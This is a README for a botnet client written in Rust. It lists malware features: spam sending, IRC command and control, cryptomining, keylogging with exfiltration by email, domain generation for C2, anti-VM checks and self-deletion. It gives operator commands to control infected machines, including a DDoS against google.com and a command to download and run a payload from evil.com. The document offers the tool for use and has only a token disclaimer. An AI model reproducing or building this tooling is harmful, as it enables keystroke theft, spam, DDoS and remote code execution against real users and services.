# Botnet Client

This is a simple botnet client implemented in Rust. It includes functionalities for SOCKS5 proxy, sending spam emails, IRC command and control, cryptocurrency mining, keylogging with exfiltration, DGA for C2 domains, anti-VM detection, and self-deletion.

## Features

- **SOCKS5 Proxy**: Connects through a SOCKS5 proxy (placeholder).
- **Email Spam**: Sends spam emails using SMTP.
- **IRC C2**: Connects to an IRC server for command and control.
- **Cryptocurrency Mining**: Performs CPU-based mining using SHA3 hashing.
- **Keylogger + Exfil**: Captures keystrokes and exfiltrates via email.
- **DGA for C2 Domains**: Generates domain names using date-based seed.
- **Anti-VM Detection**: Checks for virtual machine indicators.
- **Self-Delete**: Deletes the executable after execution.
- **Persistence**: Logs the running process to a file.
- **Command Handling**: Executes commands received from the C2 server.

## Example Commands

- `!cmd ddos google.com 80 120` → DDoS for 2 minutes
- `!cmd spam victim@mail.com 100` → Send 100 spam emails
- `!cmd proxy 1080` → Start SOCKS5 proxy on port 1080 (placeholder)
- `!cmd download http://evil.com/payload.exe` → Download and run the payload
- `!cmd mine` → Start cryptocurrency mining
- `!cmd keylog` → Start keylogger
- `!cmd exfil` → Exfiltrate captured keystrokes
- `!cmd dga` → Generate DGA domains
- `!cmd antivm` → Check for VM
- `!cmd selfdelete` → Self-delete the bot

## Usage

1. Configure the `config.toml` file for IRC settings (or hardcoded).
2. Run the botnet client.
3. Use the example commands to control the botnet.

## Disclaimer

This software is for educational purposes only. Use responsibly and within the bounds of the law.
